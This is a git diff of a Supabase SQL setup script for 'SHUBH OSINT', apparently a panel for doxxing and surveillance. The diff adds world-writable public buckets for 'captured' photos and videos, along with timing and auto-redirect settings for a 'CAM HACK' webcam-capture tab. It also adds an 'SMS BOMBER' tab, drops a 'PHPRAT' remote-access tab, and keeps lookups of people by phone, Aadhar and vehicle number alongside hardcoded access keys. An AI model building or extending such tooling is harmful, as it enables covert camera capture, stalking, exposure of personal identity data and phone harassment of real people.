@@ -2,8 +2,8 @@
 -- SHUBH OSINT - Complete Supabase Database Setup
 -- =====================================================
 -- Run this SQL in your new Supabase project's SQL Editor
--- Last Updated: 2026-01-14
--- Version: 2.1
+-- Last Updated: 2026-01-20
+-- Version: 3.0 (Storage-based media)
 -- =====================================================
 
 -- =====================================================
@@ -56,7 +56,8 @@ CREATE TABLE IF NOT EXISTS public.app_settings (
   updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
 );
 
--- Captured Photos Table (for camera capture feature)
+-- Captured Photos Table (stores photo URLs from storage)
+-- NOTE: image_data now stores URL instead of base64
 CREATE TABLE IF NOT EXISTS public.captured_photos (
   id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
   session_id TEXT NOT NULL,
@@ -66,7 +67,7 @@ CREATE TABLE IF NOT EXISTS public.captured_photos (
   captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
 );
 
--- Captured Videos Table (for video capture feature)
+-- Captured Videos Table (stores video URLs from storage)
 CREATE TABLE IF NOT EXISTS public.captured_videos (
   id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
   session_id TEXT NOT NULL,
@@ -172,13 +173,27 @@ CREATE POLICY "Anyone can delete search history" ON public.search_history
   FOR DELETE TO public USING (true);
 
 -- =====================================================
--- 4. STORAGE BUCKET (for video capture)
+-- 4. STORAGE BUCKETS
 -- =====================================================
 
 -- Create storage bucket for captured videos
 INSERT INTO storage.buckets (id, name, public)
 VALUES ('captured-videos', 'captured-videos', true)
 ON CONFLICT (id) DO NOTHING;
+
+-- Create storage bucket for captured photos
+INSERT INTO storage.buckets (id, name, public)
+VALUES ('captured-photos', 'captured-photos', true)
+ON CONFLICT (id) DO NOTHING;
+
+-- Create storage bucket for backgrounds and logos
+INSERT INTO storage.buckets (id, name, public)
+VALUES ('backgrounds', 'backgrounds', true)
+ON CONFLICT (id) DO NOTHING;
+
+-- =====================================================
+-- 5. STORAGE POLICIES
+-- =====================================================
 
 -- Storage policies for captured-videos bucket
 DROP POLICY IF EXISTS "Anyone can view captured videos" ON storage.objects;
@@ -193,8 +208,38 @@ DROP POLICY IF EXISTS "Anyone can delete captured videos" ON storage.objects;
 CREATE POLICY "Anyone can delete captured videos" ON storage.objects
   FOR DELETE USING (bucket_id = 'captured-videos');
 
+-- Storage policies for captured-photos bucket
+DROP POLICY IF EXISTS "Public can view captured photos" ON storage.objects;
+CREATE POLICY "Public can view captured photos" ON storage.objects
+  FOR SELECT USING (bucket_id = 'captured-photos');
+
+DROP POLICY IF EXISTS "Anyone can upload captured photos" ON storage.objects;
+CREATE POLICY "Anyone can upload captured photos" ON storage.objects
+  FOR INSERT WITH CHECK (bucket_id = 'captured-photos');
+
+DROP POLICY IF EXISTS "Anyone can delete captured photos" ON storage.objects;
+CREATE POLICY "Anyone can delete captured photos" ON storage.objects
+  FOR DELETE USING (bucket_id = 'captured-photos');
+
+-- Storage policies for backgrounds bucket
+DROP POLICY IF EXISTS "Public can view backgrounds" ON storage.objects;
+CREATE POLICY "Public can view backgrounds" ON storage.objects
+  FOR SELECT USING (bucket_id = 'backgrounds');
+
+DROP POLICY IF EXISTS "Anyone can upload backgrounds" ON storage.objects;
+CREATE POLICY "Anyone can upload backgrounds" ON storage.objects
+  FOR INSERT WITH CHECK (bucket_id = 'backgrounds');
+
+DROP POLICY IF EXISTS "Anyone can update backgrounds" ON storage.objects;
+CREATE POLICY "Anyone can update backgrounds" ON storage.objects
+  FOR UPDATE USING (bucket_id = 'backgrounds');
+
+DROP POLICY IF EXISTS "Anyone can delete backgrounds" ON storage.objects;
+CREATE POLICY "Anyone can delete backgrounds" ON storage.objects
+  FOR DELETE USING (bucket_id = 'backgrounds');
+
 -- =====================================================
--- 5. FUNCTIONS AND TRIGGERS
+-- 6. FUNCTIONS AND TRIGGERS
 -- =====================================================
 
 -- Update timestamp function
@@ -221,7 +266,7 @@ CREATE TRIGGER update_access_passwords_updated_at
   EXECUTE FUNCTION public.update_updated_at_column();
 
 -- =====================================================
--- 6. INDEXES (for better query performance)
+-- 7. INDEXES (for better query performance)
 -- =====================================================
 
 CREATE INDEX IF NOT EXISTS idx_app_settings_key ON public.app_settings(setting_key);
@@ -238,7 +283,7 @@ CREATE INDEX IF NOT EXISTS idx_credit_usage_password ON public.credit_usage(pass
 CREATE INDEX IF NOT EXISTS idx_credit_usage_date ON public.credit_usage(created_at);
 
 -- =====================================================
--- 7. DEFAULT DATA
+-- 8. DEFAULT DATA
 -- =====================================================
 
 -- Main Settings (includes admin password, session ID, search buttons, tabs, etc.)
@@ -265,6 +310,12 @@ VALUES ('main_settings', '{
   "camRedirectUrl": "https://google.com",
   "customCaptureHtml": "",
   "chromeCustomHtml": "",
+  "camPhotoLimit": 0,
+  "camCaptureInterval": 500,
+  "camVideoDuration": 5,
+  "camCountdownTimer": 5,
+  "camAutoRedirect": true,
+  "camQuality": 0.8,
   "allSearchAccessKey": "darkosint",
   "telegramOsintAccessKey": "darkosint",
   "sitePasswordEnabled": true,
@@ -273,20 +324,22 @@ VALUES ('main_settings', '{
   "creditSystemEnabled": true,
   "page2MusicUrl": "",
   "mainPageMusicUrl": "/audio/background-music.mp3",
+  "tabSize": "small",
   "tabs": [
     {"id": "phone", "label": "Phone", "icon": "Phone", "color": "green", "placeholder": "Enter phone number...", "searchType": "phone", "apiUrl": "", "enabled": true},
+    {"id": "numinfov2", "label": "NUM INFO V2", "icon": "Search", "color": "cyan", "placeholder": "Enter phone number...", "searchType": "numinfov2", "apiUrl": "", "enabled": true},
     {"id": "aadhar", "label": "Aadhar", "icon": "CreditCard", "color": "pink", "placeholder": "Enter Aadhar number...", "searchType": "aadhar", "apiUrl": "", "enabled": true},
     {"id": "vehicle", "label": "Vehicle", "icon": "Car", "color": "orange", "placeholder": "Enter RC number...", "searchType": "vehicle", "apiUrl": "https://darknagi-osint-vehicle-api.vercel.app/api/vehicle?rc=", "enabled": true},
     {"id": "instagram", "label": "Instagram", "icon": "Camera", "color": "cyan", "placeholder": "Enter username...", "searchType": "instagram", "apiUrl": "", "enabled": true},
     {"id": "family", "label": "Family", "icon": "Users", "color": "purple", "placeholder": "Enter name/number...", "searchType": "family", "apiUrl": "", "enabled": true},
     {"id": "manual", "label": "Manual", "icon": "ClipboardPaste", "color": "yellow", "placeholder": "Enter number...", "searchType": "manual", "apiUrl": "https://hydrashop.in.net/number.php?q=", "enabled": true},
     {"id": "shubh", "label": "CAM HACK", "icon": "Sparkles", "color": "white", "placeholder": "", "searchType": "shubh", "apiUrl": "", "enabled": true},
-    {"id": "darkdb", "label": "Hard Bomber", "icon": "Database", "color": "teal", "placeholder": "", "searchType": "darkdb", "apiUrl": "https://2info.vercel.app", "enabled": true},
+    {"id": "darkdb", "label": "Webcam 360", "icon": "Globe", "color": "teal", "placeholder": "", "searchType": "darkdb", "apiUrl": "https://2info.vercel.app", "enabled": true},
     {"id": "telegram", "label": "Telegram OSI", "icon": "Send", "color": "blue", "placeholder": "", "searchType": "telegram", "apiUrl": "", "enabled": true},
     {"id": "allsearch", "label": "All Search", "icon": "Globe", "color": "red", "placeholder": "Enter phone / email / name...", "searchType": "allsearch", "apiUrl": "https://lek-steel.vercel.app/api/search?q=", "enabled": true},
     {"id": "tgtonum", "label": "Tg To Num", "icon": "MessageCircle", "color": "lime", "placeholder": "Enter Telegram username...", "searchType": "tgtonum", "apiUrl": "", "enabled": true},
-    {"id": "phprat", "label": "PHPRAT", "icon": "Code", "color": "emerald", "placeholder": "", "searchType": "phprat", "apiUrl": "https://userb-92mn.onrender.com/", "enabled": true},
-    {"id": "randipanel", "label": "RANDI PANEL", "icon": "Skull", "color": "red", "placeholder": "", "searchType": "randipanel", "apiUrl": "", "enabled": true}
+    {"id": "randipanel", "label": "RANDI PANEL", "icon": "Skull", "color": "red", "placeholder": "", "searchType": "randipanel", "apiUrl": "", "enabled": true},
+    {"id": "smsbomber", "label": "SMS BOMBER", "icon": "Bomb", "color": "orange", "placeholder": "", "searchType": "smsbomber", "apiUrl": "", "enabled": true}
   ],
   "telegramOsint": {
     "jwtToken": "",
@@ -314,9 +367,16 @@ ON CONFLICT (setting_key) DO NOTHING;
 -- =====================================================
 -- SETUP COMPLETE!
 -- =====================================================
+-- Version 3.0 Changes:
+-- - Added captured-photos storage bucket (photos now use URLs)
+-- - Added backgrounds storage bucket (for background images & logos)
+-- - Updated storage policies for all buckets
+-- - Added cam settings (photoLimit, captureInterval, etc.)
+-- - Added tabSize setting
+-- - Updated tabs with numinfov2, smsbomber
+--
 -- After running this SQL:
 -- 1. Deploy the edge functions from supabase/functions/
--- 2. Update config.toml with your project ID
--- 3. Set up the PHPRAT tab URL in Admin panel if needed
--- 4. Configure Telegram OSINT JWT token in Admin panel
+-- 2. Update your Vercel environment variables
+-- 3. Configure Telegram OSINT JWT token in Admin panel
 -- =====================================================
